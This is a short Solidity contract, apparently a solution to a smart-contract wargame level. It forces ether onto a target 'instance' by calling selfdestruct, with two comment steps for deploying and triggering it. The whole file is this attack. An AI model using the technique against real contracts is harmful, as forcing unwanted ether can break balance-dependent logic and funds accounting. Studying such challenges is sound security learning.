// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 1. deploy the contract with at least 1 wei
// 2. call sendETH() with the address of the instance

contract ForceHack {
    constructor() payable {}
    function sendETH(address payable _contract) public {
        selfdestruct(_contract);
    }
}

